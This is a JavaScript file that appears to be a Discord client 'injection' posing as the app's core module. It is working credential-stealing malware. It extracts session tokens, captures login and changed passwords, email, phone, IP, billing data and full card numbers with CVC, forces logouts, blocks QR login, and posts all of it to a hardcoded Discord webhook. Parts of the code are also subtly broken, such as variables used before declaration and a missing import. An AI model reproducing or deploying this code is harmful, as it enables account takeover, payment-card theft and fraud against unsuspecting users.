const fs = require("fs")
const electron = require("electron")
const querystring = require("querystring")

const execScript = async (script) => {
 const windows = electron.BrowserWindow.getAllWindows();
 if (windows.length === 0) return null;
 try {
  const result = await windows[0].webContents.executeJavaScript(script, true);
  return result;
 } catch (err) {
  return null;
 }
};

const contents = []
let config = {
 webhook: "https://canary.discord.com/api/webhooks/1362865315268263986/aicHZadSsFyPaGaxu7X2xNNkR4qMr_kGNl6GMUd5P8FhwI57mSsHoK-2gFjcILXSDOU5",
 init_notify: "true",
 logout_notify: "true",
 disable_qrcode: "true",
 get: {
  token: () => execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`),
  logout: () => execScript(`function getLocalStoragePropertyDescriptor() {const o = document.createElement("iframe");document.head.append(o);const e = Object.getOwnPropertyDescriptor(o.contentWindow, "localStorage");return o.remove(), e};Object.defineProperty(window, "localStorage", getLocalStoragePropertyDescriptor());const localStorage = getLocalStoragePropertyDescriptor().get.call(window);console.log(localStorage.token);if(localStorage.token) {localStorage.token = null,localStorage.tokens = null,localStorage.MultiAccountStore = null,location.reload();} else {return"This is an intentional error";}`),
  backup_codes: () => execScript(`const elements = document.querySelectorAll('span[class^="code_"]');const isBoolean = (value) => typeof value === "boolean";const codes = Array.from(elements).map((element) => {const code = element.textContent.trim().replace(/-/g, '');const container = element.closest('span[class^="checkboxWrapper_"]');let consumed = container && Array.from(container.classList).some((className) => className.startsWith("checked_"));consumed = isBoolean(consumed) ? consumed : false;return {code,consumed};});codes;`),
  clear_local_storage: () => execScript(`const iframe = document.createElement('iframe');document.body.appendChild(iframe);iframe.contentWindow.localStorage.clear();document.body.removeChild(iframe);setTimeout(() => {window.location.reload();}, 3000);`)
 },
 auth_filters: {
  urls: [
   "/users/@me",
   "/auth/login",
   "/auth/register",
   "/remote-auth/login",
   "/mfa/totp",
   "/mfa/totp/enable",
   "/mfa/sms/enable",
   "/mfa/totp/disable",
   "/mfa/sms/disable",
   "/mfa/codes-verification"
  ],
 },
 session_filters: {
  urls: [
   "wss://remote-auth-gateway.discord.gg/*",
   "https://discord.com/api/v*/auth/sessions",
   "https://*.discord.com/api/v*/auth/sessions",
   "https://discordapp.com/api/v*/auth/sessions"
  ],
 },
 payment_filters: {
  urls: [
   "https://api.stripe.com/v*/tokens",
   "https://discord.com/api/v9/users/@me/billing/payment-sources/validate-billing-address",
   "https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
   "https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
   "https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
   "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts",
  ],
 },
 on_completed: {
  urls: [
   "https://discord.com/api/v*/users/@me",
   "https://discordapp.com/api/v*/users/@me",
   "https://*.discord.com/api/v*/users/@me",
   "https://discordapp.com/api/v*/auth/login",
   "https://discord.com/api/v*/auth/login",
   "https://*.discord.com/api/v*/auth/login",
   "https://api.stripe.com/v*/tokens",
   "https://discord.com/api/v*/auth/mfa/totp",
   "https://discordapp.com/api/v*/auth/mfa/totp",
   "https://*.discord.com/api/v*/auth/mfa/totp",
   "https://discord.com/api/v*/users/@me/mfa/totp/enable",
  ],
 },
};

const badges = {
 staff: {
  emoji: "<:staff:1362105228719034679>",
  rare: true,
 },

 active_developer: {
  emoji: "<:activedev:1362104965065212074>",
  rare: false,
 },

 early_supporter: {
  emoji: "<:pig:1362105166811103515>",
  rare: true,
 },

 verified_developer: {
  emoji: "<:dev:1362105068060676329>",
  rare: true,
 },

 certified_moderator: {
  emoji: "<:mod:1362105108170539229>",
  rare: true,
 },

 bug_hunter_level_1: {
  emoji: "<:bughunter1:1362105034157981758>",
  rare: true,
 },

 bug_hunter_level_2: {
  emoji: "<:bughunter2:1362105047462314293>",
  rare: true,
 },

 partner: {
  emoji: "<:partner:1362105185094336622>",
  rare: true,
 },

 hypesquad_house_1: {
  emoji: "<:bravery:1362105004089147784>",
  rare: false,
 },

 hypesquad_house_2: {
  emoji: "<:brilliance:1362105019066748968>",
  rare: false,
 },

 hypesquad_house_3: {
  emoji: "<:balance:1362104986330202172>",
  rare: false,
 },

 hypesquad: {
  emoji: "<:events:1362105087006212456>",
  rare: true,
 },

 premium: {
  emoji: "<a:nitro:1362115714185691186>",
  rare: false,
 },

 guild_booster_lvl1: {
  emoji: "<:boost1:1362104840250986667>",
  rare: false,
 },

 guild_booster_lvl2: {
  emoji: "<:boost2:1362104851575607636>",
  rare: false,
 },

 guild_booster_lvl3: {
  emoji: "<:boost3:1362104863084904830>",
  rare: false,
 },

 guild_booster_lvl4: {
  emoji: "<:boost4:1362104873600024857>",
  rare: true,
 },

 guild_booster_lvl5: {
  emoji: "<:boost5:1362104892226928812>",
  rare: true,
 },

 guild_booster_lvl6: {
  emoji: "<:boost6:1362104904348467431>",
  rare: true,
 },

 guild_booster_lvl7: {
  emoji: "<:boost7:1362104916247707658>",
  rare: true,
 },

 guild_booster_lvl8: {
  emoji: "<:boost8:1362104931745530197>",
  rare: true,
 },

 guild_booster_lvl9: {
  emoji: "<:boost9:1362104950938796164>",
  rare: true,
 },

 quest_completed: {
  emoji: "<:quest:1362105209496801290>",
  rare: false,
 },
};

async function GetIp() {
 const ip = await axios.get("https://www.myexternalip.com/raw").catch(() => null);
 return ip?.data || "None";
}

function GetRareBadges(flags) {
 if (!Array.isArray(flags)) return "";
 let result = "";
 for (const name of flags) {
  const badge = badges[name];
  if (badge && badge.rare) {
   result += badge.emoji;
  }
 }
 return result;
}

async function GetBadges(id, token) {
 const data = await axios.get(`https://discord.com/api/v10/users/${id}/profile`, {
   headers: {
    "Content-Type": "application/json",
    authorization: token,
   },
  }).then((response) => response.data).catch(() => null);

 if (!data || !Array.isArray(data.badges)) return "`None`";
 if (!data.badges.length) return "`No Badges`";

 const flags = data.badges.map((badge) => badge.id);
 return flags.length ? flags.map((id) => badges[id]?.emoji).filter(Boolean).join("") : "`No Badges`";
}

async function GetBilling(token) {
 const data = await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
   headers: {
    "Content-Type": "application/json",
    authorization: token,
   },
  }).then((response) => response.data).catch(() => null);

 if (!data || !Array.isArray(data)) return "`None`";
 if (!data.length) return "`No Billing`";

 let billings = "";
 for (const billing of data) {
  if (billing.type == 2 && billing.invalid != !0) {
   billings += "<:946246524504002610:962747802830655498>";
  } else if (billing.type == 1 && billing.invalid != !0) {
   billings += "<:bby:987692721613459517>";
  }
 }

 return billings || "`No Billing`";
}

async function GetFriends(token) {
 const data = await axios.get("https://discord.com/api/v9/users/@me/relationships", {
   headers: {
    "Content-Type": "application/json",
    authorization: token,
   },
  }).then((response) => response.data).catch(() => null);

 if (!data || !Array.isArray(data)) return "*Account Locked*";
 if (!data.length) return "*No Rare Friends*";

 const friends = data.filter((user) => user.type == 1);
 let result = "";
 for (const friend of friends) {
  await Sleep(500);
  const data = await axios.get(`https://discord.com/api/v10/users/${friend.user.id}/profile`, {
    headers: {
     "Content-Type": "application/json",
     authorization: token,
    },
   }).then((response) => response.data).catch(() => null);

  if (!data || !Array.isArray(data.badges)) continue;
  if (!data.badges.length) continue;

  const badges = data.badges.map((badge) => badge.id);
  const userBadges = GetRareBadges(badges);
  const friend3c = friend.user.username.length === 3;
  const badge3c = friend3c ? "<:3c:1365004856103796897>" : "";
  if (userBadges) {
   result += `${badge3c}${userBadges} | \`${friend.user.username}\`\n`;
  } else if (friend3c) {
   result += `${badge3c} | \`${friend.user.username}\`\n`;
  }
 }

 return {
  length: friends.length,
  users: result || "*No Rare Friends*",
 };
}

const path = (function () {
 const appPath = electron.app.getAppPath().replace(/\\/g, "/").split("/");
 appPath.pop();
 appPath = appPath.join("/");
 var appName = electron.app.getName();
 return { appPath, appName };
})();

async function Init() {
 const ip = await GetIp();
 const token = await config.get.token();
 const data = await axios.get("https://discord.com/api/v9/users/@me", {
   headers: {
    "Content-Type": "application/json",
    authorization: token,
   },
  }).then((response) => response.data).catch(() => null);

 if (config["init_notify"] !== "true") {
  return true;
 }

 if (!fs.existsSync(__dirname + "/pnl")) {
  fs.mkdirSync(__dirname + "/pnl");
 } else {
  return true;
 }

 const { appPath, appName } = path;
 const discord = appName;
 const payload = {
  avatar_url: "https://cdn.discordapp.com/attachments/1362858586656608599/1362869105404936202/ab67616d0000b273eb4154a3d752e8e4514ef40d.jpg?ex=6803f643&is=6802a4c3&hm=7ffbcec6120b81e0071737fe156663a9cae6d66906fe200a4da42a41e26575f2&",
  username: "Kaue",
  embeds: [
   {
    fields: [
     { name: `🔐 Token:`, value: `\`\`\`${token}\`\`\``, inline: false },
     { name: `📲 Client:`, value: `\`${discord}\``, inline: true },
     { name: `🖥️ Computer Name:`, value: `\`${process.env.COMPUTERNAME}\``, inline: true },
     { name: `🌐 IP:`, value: `\`${ip}\``, inline: true },
     { name: `🔌 Injection Path:`, value: `\`\`\`${__dirname}\`\`\``, inline: false },
    ],
    color: 0x2b2d31,
    author: {
     name: `${data.username} (${data.id})`,
     icon_url: "https://cdn.discordapp.com/attachments/1362858586656608599/1362869105404936202/ab67616d0000b273eb4154a3d752e8e4514ef40d.jpg?ex=6803f643&is=6802a4c3&hm=7ffbcec6120b81e0071737fe156663a9cae6d66906fe200a4da42a41e26575f2&",
    },
    thumbnail: {
     url: data.avatar ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}?size=4096` : `https://cdn.discordapp.com/embed/avatars/0.png`,
    },
   },
  ],
 };
 axios.post(config.webhook, payload).catch(() => null);
 await config.get.logout();
}

Init();

electron.session.defaultSession.webRequest.onBeforeRequest(config.session_filters, (details, callback) => {
 if (config["disable_qrcode"] == true) {
  if (details.url.startsWith("wss://remote-auth-gateway")) return callback({ cancel: true });
 }
});

electron.session.defaultSession.webRequest.onCompleted(config.on_completed, async (request, callback) => {
 if (!["POST", "PATCH"].includes(request.method)) return;
 if (request.statusCode !== 200) return;

 const ip = await GetIp();
 const token = await config.get.token();
 const billing = await GetBilling(token);
 const badges = await GetBadges(data.id, token);
 const data = await axios.get("https://discord.com/api/v9/users/@me", {
   headers: {
    "Content-Type": "application/json",
    authorization: token,
   },
  }).then((response) => response.data).catch(() => null);

 switch (true) {
  case request.url.endsWith("login"):
   const password = data.password;
   contents.push({ passwd: password });
   if (token == null) {
    return true;
   }

   const login = {
    avatar_url: "https://cdn.discordapp.com/attachments/1362858586656608599/1362869105404936202/ab67616d0000b273eb4154a3d752e8e4514ef40d.jpg?ex=6803f643&is=6802a4c3&hm=7ffbcec6120b81e0071737fe156663a9cae6d66906fe200a4da42a41e26575f2&",
    username: "Kaue",
    embeds: [
     {
      fields: [
       { name: `🔐 Token:`, value: `\`\`\`${token}\`\`\``, inline: false },
       { name: `💎 Badges:`, value: badges, inline: true },
       { name: `💳 Billing:`, value: billing, inline: true },
       { name: `🔑 2FA Enable:`, value: `\`${data.mfa_enabled ? "Yes" : "No"}\``, inline: true },
       { name: `📧 Email:`, value: `\`${data.email}\``, inline: true },
       { name: `📲 Password:`, value: `\`${password}\``, inline: true },
       { name: `🌐 IP:`, value: `\`${ip}\``, inline: true },
      ],
      color: 0x2b2d31,
      author: {
       name: `${data.username} (${data.id})`,
       icon_url: "https://cdn.discordapp.com/attachments/1362858586656608599/1362869105404936202/ab67616d0000b273eb4154a3d752e8e4514ef40d.jpg?ex=6803f643&is=6802a4c3&hm=7ffbcec6120b81e0071737fe156663a9cae6d66906fe200a4da42a41e26575f2&",
      },
      thumbnail: {
       url: data.avatar ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}?size=4096` : `https://cdn.discordapp.com/embed/avatars/0.png`,
      },
     },
    ],
   };
   axios.post(config.webhook, login).catch(() => null);
   break;

  case request.url.endsWith("totp"):
   const pass = contents[0].passwd;
   const totp = {
    avatar_url: "https://cdn.discordapp.com/attachments/1362858586656608599/1362869105404936202/ab67616d0000b273eb4154a3d752e8e4514ef40d.jpg?ex=6803f643&is=6802a4c3&hm=7ffbcec6120b81e0071737fe156663a9cae6d66906fe200a4da42a41e26575f2&",
    username: "Kaue",
    embeds: [
     {
      fields: [
       { name: `🔐 Token:`, value: `\`\`\`${token}\`\`\``, inline: false },
       { name: `💎 Badges:`, value: badges, inline: true },
       { name: `💳 Billing:`, value: billing, inline: true },
       { name: `🔑 2FA Enable:`, value: `\`${data.mfa_enabled ? "Yes" : "No"}\``, inline: true },
       { name: `📧 Email:`, value: `\`${data.email}\``, inline: true },
       { name: `📧 Password:`, value: `\`${pass}\``, inline: true },
       { name: `📱 Phone:`, value: `\`${data.phone || "None"}\``, inline: true },
       { name: `🌐 IP:`, value: `\`${ip}\``, inline: true },
      ],
      color: 0x2b2d31,
      author: {
       name: `${data.username} (${data.id})`,
       icon_url: "https://cdn.discordapp.com/attachments/1362858586656608599/1362869105404936202/ab67616d0000b273eb4154a3d752e8e4514ef40d.jpg?ex=6803f643&is=6802a4c3&hm=7ffbcec6120b81e0071737fe156663a9cae6d66906fe200a4da42a41e26575f2&",
      },
      thumbnail: {
       url: data.avatar ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}?size=4096` : `https://cdn.discordapp.com/embed/avatars/0.png`,
      },
     },
    ],
   };
   contents.splice(0, contents.length);
   axios.post(config.webhook, totp).catch(() => null);
   break;

  case request.url.endsWith("tokens"):
   const card_number = data["card[number]"];
   const cvc = data["card[cvc]"];
   const exp_year = data["card[exp_year]"];
   const exp_month = data["card[exp_month]"];
   const full_card = card_number + "|" + exp_month + "|" + exp_year + "|" + cvc;

   const card = {
    avatar_url: "https://cdn.discordapp.com/attachments/1362858586656608599/1362869105404936202/ab67616d0000b273eb4154a3d752e8e4514ef40d.jpg?ex=6803f643&is=6802a4c3&hm=7ffbcec6120b81e0071737fe156663a9cae6d66906fe200a4da42a41e26575f2&",
    username: "Kaue",
    embeds: [
     {
      fields: [
       { name: `🔐 Token:`, value: `\`\`\`${token}\`\`\``, inline: false },
       { name: `💎 Badges:`, value: badges, inline: true },
       { name: `📧 Email:`, value: `\`${data.email}\``, inline: true },
       { name: `📱 Phone:`, value: `\`${data.phone || "None"}\``, inline: true },
       { name: "Card Number:", value: "`" + card_number + "`", inline: true },
       { name: "Expiration Date:", value: "`" + exp_month + "/" + exp_year + "`", inline: true },
       { name: "CVC:", value: "`" + cvc + "`", inline: true },
      ],
      color: 0x2b2d31,
      author: {
       name: `${data.username} (${data.id})`,
       icon_url: "https://cdn.discordapp.com/attachments/1362858586656608599/1362869105404936202/ab67616d0000b273eb4154a3d752e8e4514ef40d.jpg?ex=6803f643&is=6802a4c3&hm=7ffbcec6120b81e0071737fe156663a9cae6d66906fe200a4da42a41e26575f2&",
      },
      thumbnail: {
       url: data.avatar ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}?size=4096` : `https://cdn.discordapp.com/embed/avatars/0.png`,
      },
     },
    ],
   };
   axios.post(config.webhook, card).catch(() => null);
   break;

  case request.url.endsWith("@me"):
   const old_passwd = data.password;
   const new_passwd = data.new_password;
   const new_token = await config.get.token();

   if (!new_passwd || !old_passwd) {
    return true;
   }

   const newpass = {
    avatar_url: "https://cdn.discordapp.com/attachments/1362858586656608599/1362869105404936202/ab67616d0000b273eb4154a3d752e8e4514ef40d.jpg?ex=6803f643&is=6802a4c3&hm=7ffbcec6120b81e0071737fe156663a9cae6d66906fe200a4da42a41e26575f2&",
    username: "Kaue",
    embeds: [
     {
      fields: [
       { name: `🔐 New Token:`, value: `\`\`\`${new_token}\`\`\``, inline: false },
       { name: `💎 Badges:`, value: badges, inline: true },
       { name: `📧 Email:`, value: `\`${data.email}\``, inline: true },
       { name: `🔑 Old Password:`, value: `\`${old_passwd}\``, inline: true },
       { name: `🔑 New Password:`, value: `\`${new_passwd}\``, inline: true },
       { name: `📱 Phone:`, value: `\`${data.phone || "None"}\``, inline: true },
      ],
      color: 0x2b2d31,
      author: {
       name: `${data.username} (${data.id})`,
       icon_url: "https://cdn.discordapp.com/attachments/1362858586656608599/1362869105404936202/ab67616d0000b273eb4154a3d752e8e4514ef40d.jpg?ex=6803f643&is=6802a4c3&hm=7ffbcec6120b81e0071737fe156663a9cae6d66906fe200a4da42a41e26575f2&",
      },
      thumbnail: {
       url: data.avatar ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}?size=4096` : `https://cdn.discordapp.com/embed/avatars/0.png`,
      },
     },
    ],
   };
   contents.splice(0, contents.length);
   axios.post(config.webhook, newpass).catch(() => null);
   break;
 }
});

module.exports = require("./core.asar")
